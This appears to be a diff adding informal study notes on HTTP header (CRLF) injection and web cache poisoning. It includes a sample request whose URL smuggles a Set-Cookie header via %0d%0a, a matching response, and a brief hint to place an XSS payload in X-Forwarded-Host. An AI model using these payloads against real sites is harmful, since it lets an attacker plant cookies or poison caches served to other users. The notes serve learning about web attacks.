@@ -1,0 +1,60 @@
+http header injection attack 
+
+1] try to add new header in requests and see the op in response
+
+request 
+GET /test%0d%0Set-Cookie:anchorcms=allyourappd HTTP 1.1
+host : google.com 
+user-agent: ---
+
+payload - %0d%0axxx    %0d%0a url encoded == new lines
+
+response 
+HTTP/1.0 200ok
+server:
+date:
+Set-Cookie:anchorcms=allyourappd    -- payload added by hacker
+content-type : text/html
+
+Impact: 
+we could use this in vulnearability to set the new  cookie value
+
+------------------------------ end ---------------
+
+------------------------------------ http hidden attack surface -----------------------------
+
+
+web cache poisoning
+define: 
+Web caches identify resources using a few specific components of each HTTP request,together known as the cache key.Two requests with the same cache key are regarded by the cache as equivalent.The cache key typically includes the request line and Host header,but not any other headers.
+
+a web cache is a technique that stores a copy of a given resource and serve it back when requested
+
+if i am surfing a web page and another coustmer want the same page is show the same content to the another person
+if we change the requests it will affect the another person also 
+
+x-forwarded-host: xss payload
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
